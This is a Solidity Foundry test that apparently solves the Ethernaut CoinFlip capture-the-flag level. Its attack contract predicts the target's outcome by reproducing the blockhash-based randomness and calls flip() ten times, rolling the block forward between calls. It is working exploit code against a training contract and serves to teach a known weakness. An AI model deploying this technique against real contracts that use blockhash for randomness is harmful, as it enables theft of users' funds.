// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../utils.sol";

interface ICoinFlip {
  function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
  ICoinFlip internal coinFlipContract;
  // FACTOR is not public, we have to define it here.
  uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  uint blockValue;
  uint coinFlip;
  bool side;

  constructor(address _victim) {
    coinFlipContract = ICoinFlip(_victim);
  }

  function attack(Vm vm) public {
    // we need to be right 10 times in order to beat the level.
    for (uint i = 0; i < 10; i++) {
      // compute our "guess" in advance.
      blockValue = uint256(blockhash(block.number - 1));
      coinFlip = blockValue / FACTOR;
      side = coinFlip == 1 ? true : false;

      // we flip and give our "guess".
      coinFlipContract.flip(side);

      // let's move to the next block.
      vm.roll(block.number + 1);
    }
  }
}

contract CoinFlipTest is Test {
  address internal challengeAddress;
  CoinFlipAttack internal attackContract;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x9240670dbd6476e6a32055E52A0b0756abd26fd2);
    attackContract = new CoinFlipAttack(challengeAddress);
  }

  function testExploit() public {
    // pass the vm variable to allow to move forward to the next block.
    attackContract.attack(vm);
    utils.submitLevelInstance(challengeAddress);
  }
}
